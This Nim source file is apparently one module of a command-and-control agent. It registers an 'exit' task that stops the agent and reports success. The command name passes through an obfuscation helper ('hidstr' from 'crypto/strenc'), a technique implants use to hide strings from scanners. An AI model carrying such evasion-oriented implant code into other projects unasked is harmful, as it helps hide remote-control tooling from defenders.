import std/json
import core/types
import commands/registry
import crypto/strenc

proc exitExecute(taskId: string, params: JsonNode, state: AgentState,
                 send: SendMsg): TaskResult =
  state.running = false
  return TaskResult(output: "Agent exiting.", status: "success", completed: true)

proc initExit*() =
  register(hidstr("exit"), exitExecute)
